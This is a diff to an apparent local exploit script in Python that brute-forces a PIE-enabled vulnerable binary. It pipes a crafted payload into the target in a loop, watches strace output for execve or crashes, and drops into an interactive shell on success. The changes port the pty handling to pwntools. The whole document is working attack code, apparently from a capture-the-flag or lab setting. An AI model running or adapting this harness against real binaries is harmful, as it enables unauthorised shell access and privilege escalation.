@@ -3,7 +3,6 @@ import struct
 import os
 import re
 import sys
-import pty
 import select
 import fcntl
 
@@ -143,7 +142,7 @@ def construct_payload(offset, vuln):
 def drain_fd(fd: int):
     try:
         while True:
-            rlist, _, _ = select.select([fd], [], [], 0.1)
+            rlist, _, _ = select.select([fd], [], [], 0.2)
             if not rlist:
                 break     #drained all trash content
             
@@ -187,7 +186,6 @@ def detect_crash(pid: int):
             lines = log_file.readlines()
 
             for line in lines:
-                # print(line)
 
                 if pattern.search(line):
                     return True
@@ -237,6 +235,7 @@ def main():
         print(f"./{vuln}: Permission denied")
         sys.exit(1)
 
+    context.log_level='warn'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
 
@@ -244,83 +243,48 @@ def main():
     construct_payload(ra_offset, vuln)
     attach_strace()
 
+    # context.log_level = 'debug'
+
     #performing brute force attack
     exploit_command = f"cat vuln_payload - | ./{vuln} " + " ".join(["`cat trash`"] * 15)
     i = 0
     while True:
-        print(f"i: {i}")
+        print(f"Attempt: {i}")
         i += 1
+        
+        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False)
+        exploit_proc.sendline()
+        
+        try:
+            while True:
 
-        master_fd, slave_fd = pty.openpty()
-
-        exploit_proc = subprocess.Popen(
-            exploit_command, shell=True, 
-            stderr=slave_fd, 
-            stdin=slave_fd, 
-            stdout=slave_fd, 
-            close_fds=True
-        )
-        os.write(master_fd, b'\n')
-
-        # print(f"\033[94mexploit proc pid: {exploit_proc.pid}\033[0m")
-    
-        while True:
-
-            if detect_execve():
-                #successful exploit, in shell
-                drain_fd(master_fd)
-
-                while True:
-                    os.write(1, b'# ')
-                    user_input = os.read(0, 5000)
-                    
-                    if b'exit' in user_input:
-                            exploit_proc.terminate()
-                            os.close(master_fd)
-                            os.close(slave_fd)
-                            cleanup(0)
-
-                    
-                    os.write(master_fd, user_input)  # Forward user input to the exploit shell
-                    rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
-
-                    while master_fd in rlist_response:
-                        response = os.read(master_fd, 1024)
-                        response = response.replace(b'\r', b'')
-                        if response != user_input:
-                            os.write(1, response)
-                            break
-
-                        rlist_response, _, _ = select.select([master_fd], [], [], 0.1)
+                if detect_execve():
+                    log.success("Exploit successful, shell spawned!")
+                    drain_fd(exploit_proc.proc.stdout.fileno())
+                    exploit_proc.interactive()
+                    exploit_proc.close()
+                    cleanup(0)
 
 
-            rlist, _, _ = select.select([master_fd], [], [], 0.1)
-
-            if master_fd in rlist:                
-                try:
-                    output = os.read(master_fd, 100000)
-                    if output:
-                        if detect_crash(exploit_proc.pid) or i == 1:    #must find the bug related to the first run and the missing logs!
-                            with open(log_file_path, 'a+') as log_file:
-                                fcntl.flock(log_file, fcntl.LOCK_EX)
-                                try:
-                                    # print(f"fp position before truncating: {log_file.tell()}")
-                                    # print(f"file size: {os.path.getsize(log_file_path)}")
-                                    log_file.truncate(0)                    #empty the log file from the logs of the previous attempts to minimize the load of the linear search
-                                    log_file.seek(0)
-                                    # print(f"fp position after truncating: {log_file.tell()}")
-
-                                finally:
-                                    fcntl.flock(log_file, fcntl.LOCK_UN)
-                            break
-                    else:
+                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for vuln to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
+                
+                if output:
+                    if detect_crash(exploit_proc.pid) or i == 1:
+                        with open(log_file_path, 'a+') as log_file:
+                            fcntl.flock(log_file, fcntl.LOCK_EX)
+                            try:
+                                log_file.truncate(0)  #empty log file to reduce load during searches
+                                log_file.seek(0)
+                            finally:
+                                fcntl.flock(log_file, fcntl.LOCK_UN)
                         break
-                except OSError:
+                else:
                     break
 
-        os.close(master_fd)
-        os.close(slave_fd)
-            
+        except EOFError:
+            log.warning("No output received, breaking out of loop.")
+
+        exploit_proc.close()
 
 
 if __name__ == "__main__":
